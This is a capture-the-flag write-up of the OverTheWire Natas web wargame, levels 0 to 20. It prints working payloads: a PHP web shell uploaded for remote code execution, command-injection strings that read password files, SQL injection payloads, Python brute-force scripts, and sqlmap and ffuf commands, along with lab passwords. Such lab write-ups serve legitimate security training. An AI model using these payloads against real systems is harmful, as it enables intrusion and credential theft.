---  
title: "OverTheWire: Natas - Full Walkthrough"  
date: 2026-05-03 +0700  
categories: [CTF-Writeups, OverTheWire, Bandit]  
tags: [web, OverTheWire, Network, Command, Write-up]
image:
  path: https://hackmd.io/_uploads/BkNkrJrRWx.png
math: true
---

Actually, I pretty like OTW wargames, ỉt's like a very exciting way to practice. And this is also a write up of a OTW wargame which is **Natas** - a wargame specific for basic web exploitation skill.
## Level 0 - 1
When login it say "password for next level on this page". But there nothing in the page.
![image](https://hackmd.io/_uploads/rJy6fQCTbe.png)
However, if we check the source code of the pages we can see it is hide in the comment section. Althought, it's not rendered through page, we can see it clearly in the client-side code. 
*You can use Ctrl + U shortcut for most browser or right click -> Inspect to view the client-side code*
![image](https://hackmd.io/_uploads/SJG4M7ATZx.png)
```
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
```
**Root cause:** (information disclosure) the developer place sensitive data in the client-side comment.

## Level 1 - 2
In this level, it say that we cannot use right click, maybe password is still in the client-side code but we can not use right click -> inspect but there is hundered ways too view the code one of which is Crtl + U shortcut.
![image](https://hackmd.io/_uploads/SJ2LIQRaWl.png)
```
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```
**Root cause:** (informaion disclosure) still  the same as sensitive data is in the client-side comment.

## Level 2 - 3
In the page, by viewing the client-side code, we see a strange image, that we almost can not see unless reading the code.
![image](https://hackmd.io/_uploads/BkUDv7ATZe.png)
It really like its name "pixel", as the image is size of one pixel with white color that I dont even think any people can see it on the page=)).
![image](https://hackmd.io/_uploads/SJJb_706-g.png)
But we see it in folder files, try to access it we can see there another file name users.txt in that folder. And that is the password, access and get the natas3 password.
![image](https://hackmd.io/_uploads/r1g_u70aWe.png)
```
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
**Root cause**: Directory listing enabled on web server

## Level 3 - 4
It say there no information leak, even Google can not find it. This is a **hint** that there a file name `robots.txt` that tell the search engine bot what page of the web is allowed to visit and shows to the search result. Try access the robots.txt at the root of the website.
![image](https://hackmd.io/_uploads/B1Hc57ATbg.png)
As we see there is a folder is disallowed, try accessing it, we can see the file users.txt containing natas4 password.
![image](https://hackmd.io/_uploads/rJWyj7AT-g.png)
```
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Level 4 - 5
It say that only user that come from `http://natas5.natas.labs.overthewire.org/` is allowed.
In this we have many methods. But I will show two methods:
### Method 1 
Change the `Referer` header. As if we intercept the request we can see it authorize by `Referer` header, so we can use **Burp suite** to intercept and change it to `http://natas5.natas.labs.overthewire.org/` to bypass and get the password.
![image](https://hackmd.io/_uploads/HJ18ZNCTZl.png)

### Method 2
This is another way to do it in only the browser, the theory is still add `Referer` header but automatically by browser. I access natas5 and cancel sign in -> get a page, I edit the code and added a `iframe` that src is from `http://natas4.natas.labs.overthewire.org`, then we can see the page is now authorized. Another way is use `a` tag to make a link to natas4.
![image](https://hackmd.io/_uploads/rkupk4AaWl.png)
```
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
## Level 5 - 6
In this level, it tell us that we are not login. View the application cookie, we can see there is a cookie `loggedin` with value 0. 
![image](https://hackmd.io/_uploads/BkVDUeJAbe.png)
We will try to change it to another number, try 1 and reload then bombb, we get the password. Actually, changing to 1 or any number except 0, cookie is automatically set to 1 and get the password.
![image](https://hackmd.io/_uploads/HJg_vxkRZx.png)
```
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

## Level 6 - 7
We have an input and source code provied, that we can see by clicking the `View source code` button. and in the code we can see the authentication mechanisim
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
It include a file name `secret.inc` to check if the password is equal to the variable in that file.
the `.inc` is a text file is used to make the include file for application, storing variable, function, ... for reusable purpose.
Try visit `includes/secret.inc` we can see the secret for authentication.
![image](https://hackmd.io/_uploads/rkJQFe1Cbe.png)
Type the secret in the input then get the password for next level.
![image](https://hackmd.io/_uploads/SyAuFg1C-g.png)
```
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```
## Level 7 - 8
If we try to click to page home, about, we can see the path have an param named `page` to get the corresponding page. And in the client-side code we can see there is a hint that the password is at `/etc/natas_webpass/natas8`.
![image](https://hackmd.io/_uploads/BJMZheyAZl.png)
So it is a hint, the parameter might vulnerable to a vulnerable that can read the system file. type a random value in the parameter we can see it show an error which reveal the mechianism of the web that it use the function `include` to get the file content, which confirm **LFI** vulnerability
![image](https://hackmd.io/_uploads/BJVAnxy0-g.png)
In this function, we can use either relative path or absolute path. Try `/etc/natas_webpass/natas8` in the param and we get the password.
![image](https://hackmd.io/_uploads/r1Kq0x1C-x.png)
```
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
## Level 8 - 9
In this challenges, again, we see an input. The authentication is it use encode user input and check it with a encoded secret in the server.
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
We can see the unencoded secret and the encoded mechainism so just reverse the step of encoding to get the secret. We can use many tool like cyberchef.io or just an php compiler to decode
![image](https://hackmd.io/_uploads/rJjExby0Zg.png)
```
secret: oubWYf2kBq
```
Input it and get the password.
![image](https://hackmd.io/_uploads/S1Tvg-JRbl.png)
```
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
## Level 9 - 10
We can see it search the user input in a dictionary file directly by appending and running an OS command.
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
We can just use some sign like `;` in the input to run another command. 
Try `; ls # ` - end the `grep` command run `ls` and comment the `dictionary.txt` part.
Remember the level 7 - 8 the password for next level is at `/etc/natas_webpass/natas10`
Use `; cat /etc/natas_webpass/natas10 #` to get the password
![image](https://hackmd.io/_uploads/rkzM7bJRWl.png)
```
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Level 10 - 11 
In this level, it has a filter to prevent **OS command injection**
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
The filter prevent it pretty well but if we just want to get the password we just change the payload and the file used to grep using 
`'' /etc/natas_webpass/natas11 #`
the whole payload become
`grep -i '' /etc/natas_webpass/natas11 # dictionary.txt`
So we can read the password
![image](https://hackmd.io/_uploads/rkOOTZJAbl.png)
```
Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
## Level 11 - 12 
Read the code we can see it use XOR to protect the cookie data, and we do not know the key.
```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```
But XOR have a property:

$$A \oplus B = C$$

$$C \oplus B = A$$ 

$$C \oplus A = B$$

So the idea is we use the data in the cookie XOR with the unencrypted data to get the key, then we change the data and XOR encrypt with that key.
We can use the PHP complier to write code to get the key.
![image](https://hackmd.io/_uploads/Skp94zJRWx.png)
Then we have the key repeatedly
```
eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```
=> Key `eDWo`

Change "showpassword" to yes then encrypt it with the key we get.
![image](https://hackmd.io/_uploads/SkmF_my0-l.png)
Change `data` cookie to the new cookie we get the password
![image](https://hackmd.io/_uploads/rJ9ROmJCbl.png)
```
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```
## Level 12 - 13 
By reading the source code, we can see it allow uploading file without any filter for malicous file, just the file size < 1kB.
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

So here we just make a malicous file containing php code to execute. We can use Burp suite to intercept the request, change the form `filename` data to `.php` because it automatically add `.jpg` when load page.
Here I upload a simple file with phpinfo function.
![image](https://hackmd.io/_uploads/HyBinXJCbe.png)
Access the uploaded file we can see it execute php and result the php info
![image](https://hackmd.io/_uploads/S1ugamy0-g.png)
So we can make a simple web shell to RCE and read the password.
```
<?php system($_GET['c']) ?>
```
![image](https://hackmd.io/_uploads/ByqY6XyA-g.png)
![image](https://hackmd.io/_uploads/S1Qa6XyRWg.png)
![image](https://hackmd.io/_uploads/H1w6AQJRWe.png)

```
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

## Level 13 - 14 
In this level it have a filter that used function exif_imagetype to check if the file is an image.
```php
 else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```
And in the PHP document page it say
![image](https://hackmd.io/_uploads/BJTkl8kR-x.png)
This function will check first bytes to check if its is image or not. 
The first bytes is generally called "magic bytes" or "file signature", it tell that what type of the file is.
So that, the solution is just same as the level before, but we add legal image data in the first bytes.
We can download a random image from the Internet, upload then intercept the request with **Burp suite**, now, we have legal first bytes.
![image](https://hackmd.io/_uploads/rJ37rLJAbx.png)
Then we remove the while image content except the first bytes, then replace with the php code to make web shell.
![image](https://hackmd.io/_uploads/H1DCzLy0Wg.png)
Then we get RCE and get the password for next level
![image](https://hackmd.io/_uploads/ryS2GLk0Zg.png)
```
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
## Level 14 - 15
In this level, we can see the web query database directly, append user input without filter or sanitize the input. So it vulnerable to **SQL Injection**
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
We just use the legend payload `admin" OR 1=1 -- ` in admin and random password the query will become 
`"SELECT * from users where username="admin" OR 1=1 -- and password="wtf"`
Then we get access and get the password for the next level
![image](https://hackmd.io/_uploads/H1N5uLJCWl.png)
```
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
*I just try to guest the username and it is `natas15`, use payload like `natas15" -- ` we also get the passwd too*

## Level 15 - 16
This level have a function to check username in the database then response it exist or not.
```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```
It query the database then if result has at least 1 row, it response exist, otherwise, response nonexist. It still append user input directly in the query so it also vunerable to **SQL Injection**, but we just use the true/false - exist/nonexist to determine the result -> **Boolean-based SQL Injection**
We already know that it has a table `users` with `username`, `password` columns. I guess username is `natas16`, and check it actually exist.Now we can use brute force the password with the payload
`natas16" AND password LIKE "<character_to_bruteforce>%`
Here I have a python script to automatically brute force 
```python
import requests
import string

target_url = "http://natas15.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==",
}

chars = string.ascii_letters + string.digits
password = ""

print("Start brute forcing")

for i in range(32):
    for char in chars:
        payload = f"natas16\" AND password LIKE \"{password + char}%"
        data = {"username": payload}
        
        try:
            response = requests.post(target_url, headers=headers, data=data)
            
            if "This user exists" in response.text:
                password += char
                print(f"Found character {len(password)}: {char}  =>  Current passwd: {password}")
                break
        except Exception as e:
            print(f"Error: {e}")

print(f"Found password for natas16: {password}")
```
Run the script and then we get the password
![image](https://hackmd.io/_uploads/SktAYvJR-x.png)
Anyway, I try `sqlmap` but I can not, idk why=))
```
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
## Level 16 - 17
Another command injection challnge like in previous level but this added more security
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
The filter now make us cannot escapse " ", but the $() is still usable. We will have a payload to brute force
```
$(grep ^{test_str} /etc/natas_webpass/natas17){ANCHOR}
```
the full command that execute is
```
grep -i "$(grep ^{test_str} /etc/natas_webpass/natas17){ANCHOR}" dictionary.txt
```
The idea here is that we choose one word that contained in dictionary.txt ex word "Americanisms", then we can use grep inside and bruteforce the test_str by loop through the range a-z,A-Z,0-9. If it contain it will return the whole password and the command become 
```
grep -i "<natas17pass>Americanisms" dictionary.txt
```
so it will not return anything because there are not any word like that. However, if it not contain it will return nothing then it will response the word "Americanisms".
I have a script to automatic bruteforce with that payload 
```python!
import requests

URL = "http://natas16.natas.labs.overthewire.org/"
HEADERS = {
    "Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==",
}
ANCHOR = "Americanisms" 
CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
PASS_FILE = "/etc/natas_webpass/natas17"

def exploit():
    password = ""
    session = requests.Session()
    session.headers.update(HEADERS)

    print(f"[+] Anchor: {ANCHOR}")

    for i in range(1, 33):
        found = False
        for char in CHARSET:
            test_str = password + char
            payload = f"$(grep ^{test_str} {PASS_FILE}){ANCHOR}"
            
            response = session.get(URL, params={'needle': payload})
            
            if ANCHOR not in response.text:
                password += char
                print(f"[#] {i:02}: '{char}' -> {password}")
                found = True
                break
        
        if not found:
            print("\nNot Found")
            break

    print(f"\nFound pasword: {password}")

if __name__ == "__main__":
    exploit()
```
![image](https://hackmd.io/_uploads/SkGzzhyRbg.png)
```
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```

## Level 17 - 18
In this level it still have the same mechanism as level 15 - 16 but here it not echo out that user exist or not
```php
if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
```
So here we have another SQL Injection technique which is called **Time-based SQL Injection** in this technique we will use a sleep function in SQL to delay response in few seconds if get correct character, if not it response immediately, so we can determine the data by this technique.
Here we can use `sqlmap` to attack with time based technique
```
 sqlmap -H "Authorization: Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==" --data "username=name" --dbms=MySQL --technique=T --level 5 -u "http://natas17.natas.labs.overthewire.org"
 ```
 ![image](https://hackmd.io/_uploads/HJoNFhyCWe.png)
Add flag -T users (table users) -C password (column password) --dump to get password in table column password of table users
```
sqlmap -H "Authorization: Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==" --data "username=hi" --dbms=MySQL --technique=T --level 5 -u "http://natas17.natas.labs.overthewire.org" -T users -C password --dump
```
![image](https://hackmd.io/_uploads/B1X6IpyRZl.png)
After a long time, we got 4 password, trying all of these password to get the real password
```
Password: 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd
```
## Level 18 - 19 
In this challenge, the web has remove the admin login function. But look at the code, we can see the web create session id with only numberic number from 1 to 640 without using the $user variable, so that we can change the session id value to IDOR and access to other people account.
```php
$maxid = 640; // 640 should be enough for everyone
// ...
function createID($user) { /*
    global $maxid;
    return rand(1, $maxid);
}
```
We can use **Burp suite** Intruder to brute force from 1 - 640 to get the sesion of admin user
Go to Intruder -> Sniper attack with Numbers payload type and then I found the password at session number 119
![image](https://hackmd.io/_uploads/Hyl_2pkC-x.png)
```
Passwors: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

## Level 19 - 20
In this level, it say code is the same but session id is not sequential.
After loging in with a credential `admin:1`, we got a session id
![image](https://hackmd.io/_uploads/BkblWdlC-l.png)
this id `3437362d61646d696e` is not a sequentail number but when convert from hex, it become `476-admin`  
![image](https://hackmd.io/_uploads/SkOOW_eCbx.png)
Which we can guess this format is `476` is session id and `admin` is our username so it's format is
`<id 1-640>-<username>`
So we will use this format with username `admin` and id range from 1 to 640 to brute force session id.
I have a python script to make the wordlist include that format range from 1 to 640
```python
for i in range(1, 641):
        print(f"{i}-admin".encode("utf-8").hex())
```
This time, we know the output format so we can use `ffuf` to bruteforce for much faster speed
```
ffuf --request-proto http --request rq.txt -t 200 -fr 'regular user' -w list.txt
```
![image](https://hackmd.io/_uploads/S1O8UuxAZg.png)
The session have admin id is `281`
![image](https://hackmd.io/_uploads/B11CIue0bx.png)
now, we can use that session id to get the password
![image](https://hackmd.io/_uploads/SJ7bwOl0be.png)
